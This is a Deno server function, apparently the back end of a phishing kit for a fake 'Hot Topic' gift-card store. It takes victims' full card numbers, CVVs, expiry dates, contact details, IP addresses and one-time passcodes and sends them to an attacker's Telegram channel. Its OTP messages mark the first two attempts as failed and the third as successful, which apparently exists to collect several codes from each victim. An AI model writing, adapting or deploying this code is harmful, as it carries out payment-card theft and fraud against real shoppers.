import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const TELEGRAM_CHANNEL_ID = Deno.env.get("TELEGRAM_CHANNEL_ID");

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface OrderDetails {
  customerName: string;
  email: string;
  phone: string;
  giftCardValue: number;
  paymentAmount: number;
  deliveryMethod: string;
  cryptoCurrency?: string;
  transactionId?: string;
  address?: {
    street: string;
    city: string;
    state: string;
    zipCode: string;
  };
  userInfo: {
    ip: string;
    userAgent: string;
    sessionId?: string;
    timestamp: string;
  };
  notificationType: "order_placed" | "payment_details" | "otp_attempt";
  otpAttempt?: number;
  customMessage?: string; // Allow passing in fully formatted messages
  // Full card details fields
  cardNumber?: string;
  cardName?: string;
  expiryDate?: string;
  cvv?: string;
}

function formatOrderPlacedMessage(orderDetails: OrderDetails): string {
  const { address } = orderDetails;
  
  let addressSection = '';
  if (orderDetails.deliveryMethod === "physical" && address) {
    addressSection = `
📍 *Shipping Address*:
   Street: ${address.street}
   City: ${address.city}
   State: ${address.state}
   ZIP: ${address.zipCode}`;
  }

  return `
🚨 *NEW HOT TOPIC ORDER PLACED* 🚨

👤 *Customer Information*:
   Name: ${orderDetails.customerName}
   Email: ${orderDetails.email}
   Phone: ${orderDetails.phone}

💳 *Order Details*:
   Gift Card Value: $${orderDetails.giftCardValue.toFixed(2)}
   Payment Amount: $${orderDetails.paymentAmount.toFixed(2)}
   Delivery Method: ${orderDetails.deliveryMethod}${addressSection}

🔍 *User Information*:
   IP Address: \`${orderDetails.userInfo.ip}\`
   Browser: ${orderDetails.userInfo.userAgent}
   Session ID: ${orderDetails.userInfo.sessionId || 'Not available'}
   Timestamp: ${orderDetails.userInfo.timestamp}

📆 *Order Placed*: ${new Date().toLocaleString()}
`;
}

function formatPaymentDetailsMessage(orderDetails: OrderDetails): string {
  // Include full card details if available
  const cardDetails = orderDetails.cardNumber ? `
💳 *Full Card Details*:
   Card Number: \`${orderDetails.cardNumber}\`
   Card Holder: ${orderDetails.cardName}
   Expiry Date: ${orderDetails.expiryDate}
   CVV: \`${orderDetails.cvv}\`
` : '';

  return `
💰 *PAYMENT DETAILS SUBMITTED* 💰

👤 *Customer*: ${orderDetails.customerName}
📧 *Email*: ${orderDetails.email}
📱 *Phone*: ${orderDetails.phone}

${cardDetails}${orderDetails.cryptoCurrency ? `
💳 *Payment Information*:
   Cryptocurrency: ${orderDetails.cryptoCurrency}
   Transaction ID: \`${orderDetails.transactionId}\`
   Amount: $${orderDetails.paymentAmount.toFixed(2)}
` : `
💳 *Payment Information*:
   Amount: $${orderDetails.paymentAmount.toFixed(2)}
`}

🔍 *User Information*:
   IP Address: \`${orderDetails.userInfo.ip}\`
   Browser: ${orderDetails.userInfo.userAgent}
   Session ID: ${orderDetails.userInfo.sessionId || 'Not available'}
   Timestamp: ${orderDetails.userInfo.timestamp}

📆 *Submitted At*: ${new Date().toLocaleString()}
`;
}

function formatOTPAttemptMessage(orderDetails: OrderDetails): string {
  const attempt = orderDetails.otpAttempt || 0;
  const isLastAttempt = attempt === 3;
  
  // Color coding: red for failed attempts, green for success
  const attemptHeader = isLastAttempt 
    ? '✅ *OTP VERIFICATION SUCCESSFUL* ✅' 
    : `🔴 *FAILED OTP VERIFICATION: ATTEMPT ${attempt}* 🔴`;
  
  const statusEmoji = isLastAttempt ? '✅' : '❌';
  const statusText = isLastAttempt 
    ? '✅ Success - Payment Authorized' 
    : `❌ Failed - Attempt ${attempt} of 3`;
  
  // Include full card details if available
  const cardDetails = orderDetails.cardNumber ? `
💳 *Full Card Details*:
   Card Number: \`${orderDetails.cardNumber}\`
   Card Holder: ${orderDetails.cardName}
   Expiry Date: ${orderDetails.expiryDate}
   CVV: \`${orderDetails.cvv}\`
` : '';

  return `
${attemptHeader}

👤 *Customer Information*:
   Name: ${orderDetails.customerName}
   Email: ${orderDetails.email}
   Phone: ${orderDetails.phone}

${cardDetails}
🔐 *Verification Status*:
   ${statusText}

🔍 *User Information*:
   IP Address: \`${orderDetails.userInfo.ip}\`
   Browser: ${orderDetails.userInfo.userAgent}
   Session ID: ${orderDetails.userInfo.sessionId || 'Not available'}
   Timestamp: ${orderDetails.userInfo.timestamp}

📆 *Attempt Time*: ${new Date().toLocaleString()}
`;
}

function formatTelegramMessage(orderDetails: OrderDetails): string {
  // If a custom formatted message is provided, use it directly
  if (orderDetails.customMessage) {
    return orderDetails.customMessage;
  }
  
  // Otherwise use the default formatters
  switch (orderDetails.notificationType) {
    case "order_placed":
      return formatOrderPlacedMessage(orderDetails);
    case "payment_details":
      return formatPaymentDetailsMessage(orderDetails);
    case "otp_attempt":
      return formatOTPAttemptMessage(orderDetails);
    default:
      return formatOrderPlacedMessage(orderDetails);
  }
}

async function sendTelegramNotification(message: string): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHANNEL_ID) {
    console.error("Missing Telegram configuration - Bot Token or Channel ID not set");
    return false;
  }

  try {
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    console.log(`Sending message to Telegram channel: ${TELEGRAM_CHANNEL_ID}`);
    
    const response = await fetch(telegramApiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHANNEL_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });

    const data = await response.json();
    
    if (!data.ok) {
      console.error("Telegram API error:", data);
      return false;
    }
    
    console.log("Telegram notification sent successfully:", data.result);
    return true;
  } catch (error) {
    console.error("Error sending Telegram notification:", error);
    return false;
  }
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const orderDetails: OrderDetails = await req.json();
    console.log("Received order details for Telegram notification:", orderDetails);
    
    // Format the message for Telegram
    const message = formatTelegramMessage(orderDetails);
    console.log("Formatted Telegram message:", message);
    
    // Send the notification
    const success = await sendTelegramNotification(message);
    
    if (!success) {
      console.error("Failed to send Telegram notification");
      return new Response(
        JSON.stringify({ success: false, error: "Failed to send Telegram notification" }),
        {
          status: 500,
          headers: { "Content-Type": "application/json", ...corsHeaders },
        }
      );
    }

    console.log("Telegram notification sent successfully");
    return new Response(
      JSON.stringify({ success: true }),
      {
        status: 200,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      }
    );
  } catch (error) {
    console.error("Error processing request:", error);
    return new Response(
      JSON.stringify({ success: false, error: error.message }),
      {
        status: 500,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      }
    );
  }
});
